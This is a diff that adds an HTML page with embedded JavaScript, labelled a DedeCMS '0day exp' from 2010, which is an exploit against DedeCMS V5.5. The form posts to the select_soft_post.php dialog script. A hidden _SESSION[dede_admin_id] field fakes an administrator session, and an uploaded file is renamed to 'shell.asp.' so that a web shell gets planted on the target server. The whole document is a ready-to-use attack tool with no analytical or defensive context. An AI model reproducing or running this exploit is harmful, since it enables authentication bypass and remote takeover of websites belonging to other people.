@@ -1,0 +1,22 @@
+&lt;form action=&quot;&quot; method=&#039;POST&#039; enctype=&quot;multipart/form-data&quot;&gt;
+  U&amp;nbsp;R&amp;nbsp;L:&lt;input type=&quot;text&quot; name=&quot;target&quot; size=&quot;50&quot; value=&quot;http://192.168.1.110&quot;&gt;&amp;nbsp;&amp;nbsp;
+  Path:&lt;input type=&quot;text&quot; name=&quot;path&quot; value=&quot;/DedeCmsV55-GBK-Final/uploads/include/dialog/select_soft_post.php&quot; size=&quot;90&quot;&gt;&lt;br&gt;
+File:&amp;nbsp;&lt;input type=&#039;file&#039; name=&#039;uploadfile&#039; size=&#039;25&#039; /&gt;(Filetype must be GIF/JPEG etc)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+      RenameTo:&lt;input type=&#039;test&#039; name=&#039;newname&#039; value=&quot;shell.asp.&quot;/&gt;&lt;br&gt;
+      &amp;nbsp;
+    &lt;input type=hidden name=&quot;_SESSION[dede_admin_id]&quot; value=1&gt;
+        &lt;input type=hidden name=&quot;bkurl&quot; value=1&gt;
+      &lt;input type=&#039;button&#039; value=&#039;submit&#039; onclick=&quot;fsubmit()&quot;/&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    dedecms 0day exp..&lt;br&gt;
+    need: session.auto_start = 1&lt;br&gt;
+    By toby57    2010/2/22
+  &lt;/form&gt;
+&lt;script&gt;
+function fsubmit(){
+    var form = document.forms[0];
+    form.action = form.target.value + form.path.value;
+    tmpstr = form.target.value +&#039;/&#039;+ form.newname.value;
+    form.bkurl.value = tmpstr.substr(0,tmpstr.length-1);
+    form.submit();
+    }
+&lt;/script&gt;
